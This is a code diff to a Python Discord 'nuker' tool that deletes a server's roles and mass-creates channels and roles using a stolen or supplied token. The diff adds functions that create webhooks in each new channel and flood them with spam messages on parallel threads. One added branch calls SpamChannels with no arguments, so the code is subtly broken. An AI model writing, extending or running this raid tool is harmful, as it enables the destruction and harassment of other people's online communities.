@@ -1,4 +1,5 @@
 import threading
+from discord import channel, webhook
 import requests
 import discord
 import time
@@ -127,6 +128,26 @@ elif token_type == 'bot':
 
 client.remove_command('help')
 
+def createwebhook(channel, name):
+    try:
+        json = { 'name': name, }
+        r = requests.post(f'https://discord.com/api/v8/channels/{channel}/webhooks', headers=headers, json=json)
+
+        id = r.json()['id']
+        tk = r.json()['token']
+
+        return f'https://discord.com/api/webhooks/{id}/{tk}'
+    except:
+        pass
+
+def sendwebhook(webhook, amount, name, message):
+    try:
+        for i in range(amount):
+            json = { 'username': name, 'content': message }
+            requests.post(webhook, json=json)
+    except:
+        pass
+
 class Avery:
 
     def __init__(self, color):
@@ -191,7 +212,7 @@ class Avery:
                     self.say(f'Deleted Role {self.color} {role.strip()}')
                 break
     
-    def SpamChannels(self, guild, name):
+    def SpamChannels(self, guild, name, amount, message, spam):
         while True:
             json = { 'name': name, 'type': 0 }
             r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
@@ -200,6 +221,9 @@ class Avery:
             else:
                 if self.success(r):
                     self.say(f'Created Channel{self.color} {name}')
+                    if spam:
+                        webhook = createwebhook(r.json()['id'], name)
+                        threading.Thread(target=sendwebhook, args=(webhook, amount, name, message,)).start()
                 break
     
     def SpamRoles(self, guild, name):
@@ -254,6 +278,12 @@ class Avery:
         guild = self.ask('Guild ID')
         channel_name = self.ask('Channel Names')
         channel_amount = self.ask('Channel Amount')
+        channel_spam = self.ask(f'Spam Channels? ({self.color}Y{self.reset}/{self.color}N{self.reset})')
+        channel_spam_amount = 0
+        channel_spam_message = ''
+        if channel_spam == 'Y' or channel_spam == 'y':
+            channel_spam_amount = self.ask('Spam Amount')
+            channel_spam_message = self.ask('Spam Message')
         role_name = self.ask('Role Names')
         role_amount = self.ask('Role Amount')
         print()
@@ -269,7 +299,11 @@ class Avery:
         for role in roles:
             threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
         for i in range(int(channel_amount)):
-            threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()
+            if channel_spam == 'Y' or channel_spam == 'y':
+                threading.Thread(target=self.SpamChannels, args=(guild, channel_name, channel_spam_amount, channel_spam_message, True)).start()
+            else:
+                self.SpamChannels()
+                threading.Thread(target=self.SpamChannels, args=(guild, channel_name, 0, '', False)).start()
         for i in range(int(role_amount)):
             threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()
         
@@ -309,10 +343,19 @@ class Avery:
         guild = self.getGuild()
         name = self.ask('Channel Names')
         amount = self.ask('Amount')
+        spam = self.ask(f'Spam channel ({self.color}Y{self.reset}/{self.color}N{self.reset})')
+        spamamount = 0
+        message = ''
+        if spam == 'Y' or spam == 'y':
+            spamamount = int(self.ask('Spam message amount'))
+            message = self.ask('Spam message')
         print()
         for i in range(int(amount)):
-            threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()
-        
+            if spam == 'Y' or spam == 'y':
+                threading.Thread(target=self.SpamChannels, args=(guild, name, spamamount, message, True)).start()
+            else:
+                threading.Thread(target=self.SpamChannels, args=(guild, name, 0, '', False)).start()
+
     async def RoleSpam(self):
         guild = self.getGuild()
         name = self.ask('Role Names')
